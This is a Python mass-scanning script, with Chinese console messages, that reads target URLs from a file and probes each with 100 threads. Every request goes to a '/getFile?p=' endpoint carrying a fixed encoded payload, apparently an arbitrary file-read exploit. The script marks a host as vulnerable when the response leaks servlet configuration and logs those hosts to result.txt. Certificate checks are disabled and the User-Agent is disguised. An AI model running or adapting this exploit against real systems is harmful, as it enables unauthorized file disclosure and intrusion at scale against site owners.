import requests
import threading
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
file_lock = threading.Lock()

def check_vulnerability(url):
    try:
        target_url = urljoin(url.strip(), "/getFile?p=b9998b5475349fb121bb1c747c459f55427b7cbfdb484a28fbd4d9d992ab442923a2d0e2c189c9bae4c35e342dbb652c0711d79544ffef547bdbda75a26a27c6")
        headers = {
            'Host': '',
            'User-Agent': 'Mozi11a/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'close'
        }
        response = requests.get(
            target_url,
            headers=headers,
            verify=False,
            allow_redirects=False, 
            timeout=10
        )
        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code} (3xx重定向)，漏洞不存在")
            return False
        
        elif response.status_code == 200:
            if '<servlet>' in response.text:
                result = f"漏洞存在 - URL: {url}, 状态码: {response.status_code}\n"
                with file_lock:
                    with open('result.txt', 'a', encoding='utf-8') as f:
                        f.write(result)
                print(f"[VULNERABLE] {url} - 漏洞存在！已写入result.txt")
                return True
            else:
                print(f"[INFO] {url} - 状态码 200，但响应内容不包含<servlet>，漏洞不存在")
                return False
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，漏洞不存在")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return False
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")
        return False

def main():
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = f.readlines()
        
        if not urls:
            print("url.txt文件中没有找到URL")
            return
        
        print(f"开始检测 {len(urls)} 个URL，线程数: 100")
        open('result.txt', 'w').close()
        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
            completed = 0
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"[ERROR] {url} - 线程执行异常: {str(e)}")
                
                completed += 1
                if completed % 10 == 0:
                    print(f"进度: {completed}/{len(urls)}")
        
        print("检测完成！")
        
    except FileNotFoundError:
        print("错误: 未找到url.txt文件")
    except Exception as e:
        print(f"发生错误: {str(e)}")

if __name__ == "__main__":
    main()